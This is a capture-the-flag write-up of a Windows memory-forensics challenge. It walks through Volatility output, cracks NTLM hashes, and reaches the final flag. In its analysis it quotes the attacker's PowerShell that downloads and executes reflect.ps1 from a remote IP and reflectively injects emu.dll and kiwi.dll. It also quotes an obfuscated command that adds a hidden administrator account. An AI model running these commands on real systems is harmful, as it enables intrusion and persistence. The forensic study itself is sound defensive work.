# Lost in Memory
Looks like one of our Emu soldiers ran something on an Outpost machine and now it's doing strange things.
We took a memory dump as a precaution. Can you tell us whats going on?

This challenge has four parts to combine into the final flag with `_` between each answer.
Find all four answers and combine them into the flag as all lower case like `DUCTF{answer1_answer2_answer3_answer4}`
eg. `DUCTF{malicious.xlsm_invoke-mimikatz_malware.exe-malware2.exe_strong-password123}`

1. What was the name of the malicious executable? eg `malicious.xlsm`
2. What was the name of the powershell module used? eg `invoke-mimikatz`
3. What were the names of the two files executed from the malicious executable (In alphabetical order with - in between and no spaces)? eg `malware.exe-malware2.exe`
4. What was the password of the new account created through powershell? eg `strong-password123`

## Data
* EMU-OUTPOST.zip
  * EMU-OUTPOST.raw

## Solution
_I didn't solve the challenge during the competition. I was missing the password of the new account._

The following commands were pretty useful to analyze the memory dump.
```
vol.py -f EMU-OUTPOST.raw imageinfo
vol.py -f EMU-OUTPOST.raw kdbgscan
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 pslist > pslist.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 pstree > pstree.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 psxview > psxview.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 malfind > malfind.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 cmdline > cmdline.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 consoles > consoles.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 hashdump > hashdump.txt
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 memdump -p 1136 -D ./
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 memdump -p 3268 -D ./
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 memdump -p 2520 -D ./
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_24000 memdump -p 3048 -D ./
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 memdump -p 4044 -D ./
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 clipboard
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 iehistory
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 notepad
strings -n 10 -t d EMU-OUTPOST.raw > mem-strings
vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 strings -s mem-strings > translated.txt
```

### Processes
There were some interesting Notepad and Powershell processes:
```
$ vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 pstree > pstree.txt
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
[...]
 0x8453e030:notepad.exe                              3048   4068      5     78 2024-06-18 10:01:20 UTC+0000
 0x84286d20:explorer.exe                             3176   3152     47   1076 2024-06-18 09:59:51 UTC+0000
. 0x844f5d20:DumpIt.exe                              2720   3176      2     38 2024-06-18 10:02:05 UTC+0000
. 0x8439a030:notepad.exe                             4044   3176      3     78 2024-06-18 10:00:15 UTC+0000
. 0x85aa4d20:vmtoolsd.exe                            3284   3176      9    189 2024-06-18 09:59:52 UTC+0000
. 0x8442aaf8:iexplore.exe                            3620   3176     17    430 2024-06-18 10:00:01 UTC+0000
.. 0x84450030:iexplore.exe                           3696   3620     20    462 2024-06-18 10:00:02 UTC+0000
.. 0x843dad20:iexplore.exe                            372   3620     17    321 2024-06-18 10:00:37 UTC+0000
. 0x8449c528:powershell.exe                          1136   3176     17    432 2024-06-18 10:01:08 UTC+0000
.. 0x8452f600:powershell.exe                         2520   1136     11    306 2024-06-18 10:01:35 UTC+0000
.. 0x85e1f788:powershell.exe                         3268   1136     11    309 2024-06-18 10:01:34 UTC+0000
```

### Cmdline
The Cmdline of the processes doesn't give any useful information, except the one of the notepad processes:
```
$ vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 cmdline > cmdline.txt
[...]
************************************************************************
notepad.exe pid:   4044
Command line : "C:\Windows\system32\NOTEPAD.EXE" C:\Users\emu\Desktop\Monke\Monke.xlsm
************************************************************************
[...]
************************************************************************
notepad.exe pid:   3048
Command line : "C:\Windows\System32\notepad.exe" "C:\Users\emu\Downloads\monkey.doc.ps1"
************************************************************************
```
So there are two files that are suspicious: `Monke.xlsm` and `monkey.doc.ps1`

My guess here was that the XLSM file got some Macros that executed a Powershell, which run the `monkey.doc.ps1`. But I wasn't able to verify this.

### Consoles
From the Powershell process we can extract the console input:
```
$ vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 consoles > consoles.txt
[...]
**************************************************
ConsoleProcess: conhost.exe Pid: 2560
Console: 0x7881c0 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: Windows PowerShell
Title: Administrator: Windows PowerShell
AttachedProcess: powershell.exe Pid: 1136 Handle: 0x58
----
CommandHistory: 0x306550 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 3 LastAdded: 2 LastDisplayed: 2
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x58
Cmd #0 at 0x2e2c38: cd C:\Users\emu\Downloads
Cmd #1 at 0x2e2358: .\monkey.doc.ps1
Cmd #2 at 0x304588: r
----
Screen 0x2e68f0 X:120 Y:3000
Dump:
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\emu\Downloads
PS C:\Users\emu\Downloads> .\monkey.doc.ps1

Security Warning
Run only scripts that you trust. While scripts from the Internet can be useful, this script can potentially harm your
computer. Do you want to run C:\Users\emu\Downloads\monkey.doc.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): r

Id              Name            State      HasMoreData     Location             Command
--              ----            -----      -----------     --------             -------
1               Job1            Running    True            localhost            iex (New-Object net.we...
3               Job3            Running    True            localhost            iex (New-Object net.we...


PS C:\Users\emu\Downloads>
**************************************************
[...]
```
So the module `monkey.doc.ps1` started two jobs with a `iex` command. But the full command were not shown.

### Memdump
With that information I dumped the Notepad process that opened `monkey.doc.ps1` in the hope that I can extract the contents. And so it was:
```
$ vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_24000 memdump -p 3048 -D ./
[...]
$ strings -n 10 -e l ./memdump/3048.dmp | grep New-Object
Start-Job -ScriptBlock {iex (New-Object net.webclient).Downloadstring('http://192.168.57.166/reflective/reflect.ps1'); Invoke-ReflectivePEInjection -PEUrl http://192.168.57.166/documents/emu.dll};Start-Job -ScriptBlock {iex (New-Object net.webclient).Downloadstring('http://192.168.57.166/reflective/reflect.ps1'); Invoke-ReflectivePEInjection -PEUrl http://192.168.57.166/documents/kiwi.dll}
```

The module uses the command `Invoke-ReflectivePEInjection` to inject the DLLs `emu.dll` and `kiwi.dll`. With that command those DLL can be loaded into the memory of the Powershell process and run without starting new processes that would be shown in the process lists.

### Hashdump
So the first three questions can be answered, but I wasn't able to find the password of the new user. I tried to extract and crack the password of the users of the system:
```
$ vol.py -f EMU-OUTPOST.raw --profile=Win7SP1x86_23418 hashdump > hashdump.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
Emu:1003:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
Backup:1004:aad3b435b51404eeaad3b435b51404ee:50ae1c69b9ac1f8450b34279f4cb0fc9:::
$ hashcat -a 0 -m 1000 memdump_hashes /home/kali/Desktop/tools/rockyou.txt
[...]
$ hashcat -m 1000 memdump_hashes --user --show
Administrator:fc525c9683e8fe067095ba2ddc971889:Passw0rd!
Guest:31d6cfe0d16ae931b73c59d7e0c089c0:
IEUser:fc525c9683e8fe067095ba2ddc971889:Passw0rd!
sshd:31d6cfe0d16ae931b73c59d7e0c089c0:
Emu:89551acff8895768e489bb3054af94fd:P@ssw0rd123
```

I hoped that the changed password is one of those, but that was wrong.

### User password
In the Powershell processes can the following line be found:
```
$ strings memdump/1136.dmp | grep powershell
[...]
powershell $PKjAU=  ") )'dd'+'a/ n'+'i'+'mda'+' sro'+'t'+'artsinimda'+' p'+'uorglacol'+' te'+'n;d'+'d'+'a/ 3r'+'uce5-r3'+'pu'+'5'+' nimda resu '+'te'+'n'(( )'x'+]31[dIlLehs$+]1[diLLehs$ (."; .( $Env:CoMsPeC[4,24,25]-JOIn'')(-join (  gi  vaRiaBlE:pKjAU).valUe[-1 .. - ( (  gi  vaRiaBlE:pKjAU).valUe.leNgth) ] )
[...]
```

Which is an obfuscated command. If we deobfuscate it, it results in the following command:
```
'net user admin 5up3r-5ecur3 /add;net localgroup administrators admin /add'
```

So there was another user created called `admin` with the password `5up3r-5ecur3`.

### Flag
Putting all of that information together, we get the following flag:
```
DUCTF{monkey.doc.ps1_invoke-reflectivepeinjection_emu.dll-kiwi.dll_5up3r-5ecur3}
```
